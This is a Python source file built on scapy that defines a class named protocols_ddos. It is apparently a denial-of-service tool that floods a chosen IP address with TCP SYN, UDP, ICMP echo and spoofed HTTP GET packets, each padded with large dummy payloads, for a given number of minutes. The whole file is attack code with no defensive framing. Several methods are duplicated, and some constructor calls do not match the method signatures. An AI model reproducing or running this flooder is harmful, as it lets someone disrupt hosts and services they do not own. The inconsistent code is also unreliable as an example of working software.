from scapy.all import send,Raw,ICMP,IP,TCP,UDP,RandShort




class protocols_ddos(object):
    def __init__(self,ip,port,time,tcp=None,udp=None,ping=None,get=None) -> None:

        self.ip = ip
        self.port = port
        self.time = time


        self.tcp = tcp
        self.udp = udp
        self.ping = ping
        self.get = get

        try:
            if self.tcp == True:
                self.tcpflood(self.ip,self.port,self.time)
            if self.udp == True:
                self.udpflood(self.ip,self.port,self.time)
            if self.ping == True:
                self.pingflood(self.ip,self.port,self.time)
            if self.get == True:
                self.getflood(self.ip,self.time)
            return None
        except Exception:
            pass






    def tcpflood(self,port,timex):
        threshold = int(timex) * 60 #60
        ii = 0

        while True:
            ii+=0.0072 #60 secondi == 56 secondi reali
            self.maintcp(self.ip,port)
            if str(ii).split('.')[0] == str(threshold):
                break







    def udpflood(self,ipx,portx,timex):

        threshold = int(timex) * 60 #60
        ii = 0
        try:
            while True:
                ii+=0.0072 #60 secondi == 54 secondi reali
                self.mainudp(ipx,portx)
                if str(ii).split('.')[0] == str(threshold):
                    break
        except:
            pass





    def getflood(self,urlx,timex):

        threshold = int(timex) * 60 #60
        ii = 0
        try:
            while True:
                ii+=0.0072 #60 secondi == 54 secondi reali
                self.mainget(urlx)
                if str(ii).split('.')[0] == str(threshold):
                    break
        except:
            pass



    def tcpflood(self,ip,port,timex):
        threshold = int(timex) * 60 #60
        ii = 0

        while True:
            ii+=0.0072 #60 secondi == 56 secondi reali
            self.maintcp(ip,port)
            if str(ii).split('.')[0] == str(threshold):
                break




    def pingflood(self,ipx,timex):

        threshold = int(timex) * 60 #60
        ii = 0
        try:
            while True:
                ii+=0.0072 #60 secondi == 54 secondi reali
                self.mainping(ipx)
                if str(ii).split('.')[0] == str(threshold):
                    break
        except:
            pass



    def udpflood(self,ipx,portx,timex):

        threshold = int(timex) * 60 #60
        ii = 0
        try:
            while True:
                ii+=0.0072 #60 secondi == 54 secondi reali
                self.mainudp(ipx,portx)
                if str(ii).split('.')[0] == str(threshold):
                    break
        except:
            pass



#==================================================================

    def maintcp(self,ip,port):
        try:
            raw = Raw(b"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"*1024)
            send(IP(dst=str(ip))/TCP(sport=RandShort(),dport=int(port),flags='S')/raw)
            send(IP(dst=str(ip))/TCP(sport=RandShort(),dport=int(port),flags='S')/raw)
        except OSError:
            pass

    def mainget(self,url):
        payload = 'GET / HTTP/1.1\r\nHost: '+url+'\r\n\r\n'
        try:
            send(IP(dst=str(url)) / TCP(dport=80, sport=RandShort(),seq=1, ack=4060119096 + 1, flags='A') / payload)
            send(IP(dst=str(url)) / TCP(dport=80, sport=RandShort(),seq=1, ack=4060119096 + 1, flags='A') / payload)
        except OSError:
            pass


    def mainudp(self,ip,port):
        raw = Raw(b"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"*1024)
        try:
            send(IP(dst=str(ip))/UDP(sport=RandShort(),dport=int(port))/raw)
            send(IP(dst=str(ip))/UDP(sport=RandShort(),dport=int(port))/raw)
        except OSError:
            pass

    def mainping(self,ip):
        raw = Raw(b"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"*1024)
        try:
            send(IP(dst=str(ip))/ICMP(type=8)/raw)
            send(IP(dst=str(ip))/ICMP(type=8)/raw)
        except OSError:
            pass


    def maintcp(self,ip,port):
        try:
            raw = Raw(b"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"*1024)
            send(IP(dst=str(ip))/TCP(sport=RandShort(),dport=int(port),flags='S')/raw)
            send(IP(dst=str(ip))/TCP(sport=RandShort(),dport=int(port),flags='S')/raw)
        except OSError:
            pass

    def mainudp(self,ip,port):
        raw = Raw(b"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"*1024)
        try:
            send(IP(dst=str(ip))/UDP(sport=RandShort(),dport=int(port))/raw)
            send(IP(dst=str(ip))/UDP(sport=RandShort(),dport=int(port))/raw)
        except OSError:
            pass


    def mainping(self,ip):
        raw = Raw(b"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"*1024)
        try:
            send(IP(dst=str(ip))/ICMP(type=8)/raw)
            send(IP(dst=str(ip))/ICMP(type=8)/raw)
        except OSError:
            pass
